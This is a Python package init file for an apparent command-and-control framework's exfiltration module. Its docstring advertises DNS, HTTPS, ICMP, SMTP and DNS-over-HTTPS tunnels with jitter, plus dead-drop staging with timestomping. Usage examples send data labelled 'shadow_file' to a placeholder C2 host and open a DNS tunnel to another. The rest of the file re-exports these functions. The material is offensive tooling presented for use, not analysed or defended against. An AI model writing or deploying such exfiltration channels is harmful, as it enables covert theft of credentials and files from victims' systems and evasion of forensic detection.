"""
AEGIS-SILENTIUM Node Exfiltration Package
==========================================
Multi-protocol data exfiltration engine with automatic fallback:
DNS tunneling → HTTPS → ICMP → SMTP → dead-drop file staging.

All channels support chunking, jitter, and optional encryption.
The unified exfil_to_c2() function tries channels in priority order
and returns on first success.

Exports:
    exfil_to_c2         — Unified exfil with channel fallback
    DNSTunnel           — Raw UDP DNS tunnel (base32 encoded)
    HTTPSTunnel         — HTTPS POST/multipart exfil
    ICMPTunnel          — Raw ICMP packet tunnel (requires root)
    EmailExfil          — SMTP attachment exfil
    DeadDropStager      — Filesystem dead-drop with timestomping
    screenshot          — Capture screenshot → bytes

Usage:
    from node.exfil import exfil_to_c2

    # Exfil arbitrary bytes (tries DNS first, falls back to HTTPS)
    success = exfil_to_c2(
        data=b"sensitive file contents",
        label="shadow_file",
        c2_url="https://c2.yourdomain.com:5000",
        node_id="node-001",
    )

    # DNS tunnel only
    from node.exfil import DNSTunnel
    tunnel = DNSTunnel(dns_server="c2-dns.yourdomain.com", domain="tunnel.yourdomain.com")
    tunnel.send(b"data to exfil", session_id="sess-001")
"""

from .channels import (
    exfil_to_c2,
    DNSTunnel,
    HTTPSTunnel,
    ICMPTunnel,
    EmailExfil,
    DeadDropStager,
    screenshot,
)
from .doh import (
    DoHTunnel,
    ARecordTunnel,
    DoHExfilQueue,
    exfil_via_doh,
    exfil_via_a_record,
    DOH_PROVIDERS,
)

__all__ = [
    "exfil_to_c2",
    "DNSTunnel",
    "HTTPSTunnel",
    "ICMPTunnel",
    "EmailExfil",
    "DeadDropStager",
    "screenshot",
    "DoHTunnel",
    "ARecordTunnel",
    "DoHExfilQueue",
    "exfil_via_doh",
    "exfil_via_a_record",
    "DOH_PROVIDERS",
]

__version__ = "5.0"
